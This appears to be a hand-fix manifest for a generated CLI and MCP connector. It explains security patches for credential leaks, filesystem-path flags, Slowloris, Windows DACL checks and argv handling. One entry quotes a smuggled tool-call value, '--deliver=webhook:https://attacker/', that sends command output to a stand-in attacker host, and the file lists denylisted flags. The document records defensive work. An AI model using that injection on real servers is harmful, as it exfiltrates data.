_comment: Connector-specific edits a cli-printing-press reprint must NOT clobber. check_handfixes.py asserts every marker below is still present and fails CI if a reprint dropped one.

handfixes.summary: DATAGATE_CLIENT_ID is read into the generic Headers map so every request carries the required ClientId header alongside the Bearer token
handfixes.why: DataGate's auth needs a Bearer token AND a separate required ClientId header (a GUID) on every request. The spec format has no first-class slot for a second required secret header, so this rides in on the generic per-request Headers map instead. This is a GENERATOR-class gap (no first-class multi-credential-header auth mode) rather than a DataGate-specific bug; until the press supports it natively, a reprint regenerates config.go without this block and these markers guard the connector. (The header name is the clientIDHeader constant so the containment fix in clientid-secret-containment can reference the same value.)

handfixes.summary: The env-injected ClientId header is stripped on cross-origin redirects, masked in output, and never persisted to config.json
handfixes.why: The clientid-header-env-var hand-fix routes a vendor-designated secret (DataGate docs: 'You should never share your clientId') through the generic Headers map, which the generated client stamps on every request. Generated code only protects Authorization: the redirect guard deletes Authorization alone, the output masker enumerates named credential fields, and the save path persists Headers verbatim. Each of those must be taught about the second secret or the hand-fix leaks it. Header-NAME keyword matching does not work here - 'ClientId' contains no credential token - so the redirect guard strips the whole injected set instead.

handfixes.summary: MCP blocks db/input/out destination flags and any command-local flag whose usage text names a filesystem path
handfixes.why: This connector was minted from a press build predating the fleet-wide MCP filesystem hardening: all 65 other connectors block db/input/out and carry isFilesystemPathFlag, datagate did not. Without it an MCP caller can point --db at another database or feed --input a local file whose records are sent to the vendor API, as the MCP server account. The phrase list matches the fleet's (store path, mirror path, receipt destination, root directory for), and UnblockedFilesystemPathFlags walks the command set RegisterAll registers through blockedStructuredArgsForCommand itself, so TestNoShellOutToolCanDirectAFilesystemPath fails the build when a regeneration grows a local-path flag the runtime gate would still forward. Every flag datagate ships today that names a path is ALSO refused by name, so the tree test alone would stay green if a reprint dropped a phrase or unhooked the rule; TestEveryPathPhraseRefusesALocalFlagAtRuntime closes that with flag names no denylist carries, and the asserts pin all four added phrases plus both `if isFilesystemPathFlag(flag) {` call sites. Proven both directions on 2026-09-14: green on the shipped tree; the tree test goes red naming `--home` on 5 commands when 'home' is dropped from blockedRootFlags; the phrase test goes red on all 10 phrases when the rule is unhooked from blockedStructuredArgsForCommand, and on 'mirror path' alone when that phrase is removed.

handfixes.summary: doctor runs an authenticated probe against a real endpoint (doctor_verdict.go) instead of printing 'present, not verified' in every state
handfixes.why: Minted from a press build predating doctor_verdict.go, which all 65 other connectors carry. Without it doctor returned an identical all-green report for a working install, an expired token, and a base_url the API does not live at - the exact defect check_doctor_truth gates (issue #282). doctorShippedBaseURL is deliberately "" because datagate's shipped default (https://api.dgportal.net) is the real API root, not a stand-in an operator must replace; setting it would flag every correct install as a placeholder.

handfixes.summary: The MCP server's --transport http listener sets ReadHeaderTimeout so one client cannot hold it open by dribbling request headers
handfixes.why: datagate is the only connector in the fleet whose MCP server ships a --transport http mode (streamable HTTP behind bearer auth, TLS required off-loopback, resolved-IP pinning), so the generated cmd/datagate-mcp/main.go is the only place this listener exists and no press template carries the fix. The generated http.Server literal set no header-read deadline, so a single client could hold the listener open indefinitely by sending request headers one byte at a time (Slowloris). gosec G112 flags exactly this shape and the security gate raised it as P1 on PR #317; the fix adds ReadHeaderTimeout: 10 * time.Second (and the time import) to the http.Server literal. A reprint regenerates main.go without the field and go build stays green, so this marker is the only thing that notices. code_only because the explanatory comment above the field also names G112 and Slowloris - the assert must be satisfied by the field itself, never by the prose.

handfixes.summary: cliArgsFromMCP emitted every tool-call value as its OWN argv element after its flag (--json <value>). Every value-carrying branch (string, float64, []any, default) now joins the value to the flag as one element (--json=<value>); bool true stays a bare --flag and the empty-string skip is unchanged.
handfixes.why: blockedRootFlags and blockedDestinationFlags filter KEYS only. A Cobra bool flag has NoOptDefVal and does not consume the token after it, so a tool-call VALUE that begins with '--' was parsed by pflag as its own flag: {"json": "--deliver=webhook:https://attacker/"} became argv `--json --deliver=webhook:...` and the denylisted --deliver took effect. Proven end to end on the real hudu-mcp binary (the same generated shellout.go): a local webhook received 4,797 bytes of `doctor --json` output. Joined, pflag rejects the value outright on a bool flag (strconv.ParseBool) and contains it as the literal value on a string flag, so no value can ever reach a second flag. Upstream cli-printing-press 4.31.4 still emits the split form, so a reprint from the current press REINTRODUCES the defect while go build and go test stay green; this entry is what notices. code_only because the explanatory comment above the loop describes the joined form - the assert must be satisfied by the emission lines themselves. shellout_test.go (TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag) proves both directions: the split argv sets --deliver, the joined argv cannot. DURABLE FIX belongs in cli-printing-press (the cobratree/shellout.go template must emit --flag=value for every value-carrying type); file via printing-press-retro.

handfixes.summary: the Windows token-file guard compares trustees by SID, resolving SDDL aliases through the OS, so the built-in Administrator (RID 500, rendered as LA) can save and load credentials
handfixes.why: Press 4.30.2+ creds_perms_eval.go compared the SDDL text of the token file's owner and ACE trustees against the process's SID string. The SDDL converter renders the built-in local Administrator (RID 500) as the alias LA, so that account's own ACE never matched: `auth set-token` exited 1 with `token file DACL grants access to a non-owner principal (LA)` and every read refused the file. Reproduced 2026-10-15 on the published fortinet-cli 0.1.0, installed with the README one-liner on a windows-latest runner (whoami S-1-5-21-...-500). The fix resolves each trustee to its SID (fixed aliases from a table, machine-relative ones like LA through ConvertStringSidToSid, kept only when the converter renders that SID back to the same alias) and compares SIDs. The allow-list is unchanged (current user, BUILTIN\Administrators, SYSTEM): an owner or allow-ACE trustee that is any other principal, a broad group, or unresolvable is still refused. A reprint from an unfixed press silently restores the string compare while unit tests stay green on every non-Windows host.
handfixes.spec_encode_followup: Press defect in internal/generator/templates/cliutil_creds_perms_eval.go.tmpl and cliutil_creds_perms_windows.go.tmpl (unfixed on press main as of 4.33.5). Reported upstream: https://github.com/mvanhorn/cli-printing-press/issues/5029

handfixes.summary: the Windows token-file guard checks the DACL section's framing, so a NULL DACL is refused in the form Windows actually renders it, flags first (D:PAINO_ACCESS_CONTROL), and DACL text that does not frame as flags plus complete six-field ACEs is refused rather than skipped
handfixes.why: Press creds_perms_eval.go refused a NULL DACL only when the DACL section began with NO_ACCESS_CONTROL. SDDL puts DACL flags (P, AI, AR) first, and a real NULL DACL on Windows Server 2025 renders as O:<owner>D:PAINO_ACCESS_CONTROL (measured on a windows-latest runner, 2026-10-15), so the guard found no ACEs to inspect and accepted a world-accessible token file. That was already a hole for every ordinary account; for the built-in Administrator the owner-alias mismatch happened to refuse it, so resolving LA (windows-sddl-alias-sid-compare) without this fix would have widened the hole. The DACL section's framing is now checked: its flags must be drawn from P/AI/AR/NO_ACCESS_CONTROL, an empty DACL followed by a SACL section ends at that section, and the ACE list must be complete, un-nested (...) groups of exactly six fields. Unknown flags, an unclosed or nested group, stray text, or a wrong field count is refused (fail-closed). ACE flags and rights are not validated; they do not change which principal an allow ACE names.
handfixes.spec_encode_followup: Same press templates as windows-sddl-alias-sid-compare; reported in the same upstream issue: https://github.com/mvanhorn/cli-printing-press/issues/5029

handfixes.summary: mcp-install.md and README.md open with the interim HTTP-mode security note and pauses the remote-agent recipe (launch line commented out, no tunnel step) until this connector is reprinted; the README and page.json ChatGPT answers say HTTP mode is paused.
handfixes.why: Docs-only interim fix ratified 2026-10-22. This build's HTTP mode is unsafe (no password and/or no rebinding guard, no request limits, writes with no confirmation), so the install guide must not tell anyone to run it or tunnel it. mcp-install.md is regenerated by msp-skills-publish onboard.py; this entry makes a regeneration that drops the note fail CI. Remove it on purpose with the post-reprint docs fix. 2026-10-22 follow-up to #428: README.md (security note under "Works with your agent", the ChatGPT / Copilot Studio / Gemini rows, the ChatGPT paragraph and FAQ) and page.json (ChatGPT FAQ, and from there docs/skills and llms-full.txt) carry the same pause. README.md is regenerated by onboard.py render_readme; page.json's FAQ is agent-authored prose, so a re-polish that restores the HTTPS/tunnel answer fails here.

handfixes.summary: the `api` discovery hints tell the operator to run datagate-cli, the binary this repo ships, instead of datagate-pp-cli, which does not exist
handfixes.why: The press prints three follow-up hints from api_discovery.go ('Use ... <method> --help', 'Run ... api to list all interfaces', 'Use ... api <interface>'), formatting the binary name as '%s-pp-cli' around the slug. The -pp- strip renamed the binaries and the Cobra strings on every other connector but missed this format string here, so the CLI told an operator (or an agent) to run a binary that is not installed. check_no_pp_leak.py reports the '%s-pp-' format string in Go; a reprint re-emits it.
handfixes.spec_encode_followup: Press-side: the strip should rewrite '%s-pp-cli' format strings in generated Go the same way it rewrites the Cobra Use/Example strings (msp-skills strip-pp-cli).

asserts.contains: Run '%s-cli api' to list all interfaces

handfixes.summary: One decoded output funnel for every server text the client shows: maskCredentialText (every API error, transport error, displayed URL and --dry-run parameter goes through it) still masks each held credential as written and URL-escaped, then withholds the WHOLE text if any held value survives in any view reachable by undoing control/format characters, JSON and JavaScript escapes, percent escapes at any depth, HTML entities, markup tags, and base64/base64url/hex runs at every alignment (cliutil.FunnelWithhold, shared byte-identical across the fleet). The held set is every value the masks cover plus the part after a scheme word and both halves of a base64 id:secret pair (Basic auth, composed keys). Surfaces funnelled here: the API error body (checked whole before the 4096-byte display cut, then again as shown); the title of an HTML page returned where JSON was expected. Round 3 (owner-approved structural pass): the decoder searches every view breadth-first over one fixed set of steps (control-character drop, JSON and JavaScript escapes, the identity escape as its own step, percent, HTML entities, tag strip, base64 at four alignments, hex at two), matches every view, the original included, before any filter, keeps every view a step makes (a literal backslash survives), deduplicates, and is capped by total work (512 times the input plus 4 MiB; text over 1 MiB or past the cap is withheld). Every value a funnel call is given is held process-wide (cliutil.FunnelHold), and the client holds its credentials when built and its resolved auth header on every request. Two error-only backstops withhold any held value: every command error before Cobra prints it plus every JSON/agent error envelope (internal/cli/secret_funnel_cli.go), and every MCP error result and handler error through the outermost tool middleware (cmd/<mcp>/secret_funnel_mcp.go). Success output is never funnelled.
handfixes.why: class_harness.py secret-echo (Step 3.1, PR #436) drives the built CLI and MCP server against a fake server that reflects each configured credential in every encoding; on origin/main this connector printed the credential HTML-entity-encoded, JSON-escaped, double URL-encoded or base64 (the generated masks cover only the raw, QueryEscape and PathEscape forms; press issue #5145). Matching encoded needles one at a time never converged (saas-alerts and cisco-meraki review loops), so the fix is a decode-then-check backstop that withholds the whole text and fails closed (text over 4 MiB, a decoding chain that does not settle in 32 rounds, or work past the budget is withheld). Classification is kept: the plain withheld notice avoids every word the auth-error classifiers match, and a withheld text that itself read as an auth failure gets a notice that says so (an HTTP 400 'invalid token' answer echoing the token keeps its auth exit code). Codex round 1 (2026-10-23) added that, the fail-closed depth bound (a text-like layer left at depth 8 withholds), the JavaScript escapes \v, \0 and the identity escape, a bounded \u{ search, and the token-endpoint error bodies outside the client. Known limits: values under 8 characters are only masked as written; case-changed, split-and-interleaved or otherwise transformed (compressed, encrypted) echoes are not reconstructed. A reprint that drops these edits fails class_harness.py secret-echo in CI and these asserts.
handfixes.spec_encode_followup: Press-side: cli-printing-press issue #5145 (encoded credential echo). The generated maskCredentialText should end in a decode-then-check backstop over every held credential, and the error-body and token-endpoint paths should check the whole body before the display cut.
